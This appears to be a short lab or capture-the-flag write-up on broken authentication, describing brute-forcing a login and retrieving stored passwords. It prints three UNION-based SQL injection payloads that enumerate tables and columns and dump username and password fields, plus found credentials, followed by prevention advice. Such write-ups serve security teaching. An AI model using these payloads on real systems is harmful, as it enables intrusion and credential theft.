# BROKEN AUTHENTICATION

## Explanation

small bash script which loops through most common password and usernames.

The passwords were available through sql injection as well.
=> Union injection to retrieve all the tables / columns
  - 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
  - 1 AND 1=2 UNION SELECT table_name, column_name, 1 FROM information_schema.columns
  - 1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default

root / admin

## Exploitation

- Automated attacks such as bruteforcing with rainbow tables
- Test for default passwords
- Weak password policy

## Prevention

> In order to mitigate this risk, implement :
  - strong password policy
  - do not allow default credentials
  - multi factor authentication
  - limitation on failed login attemps
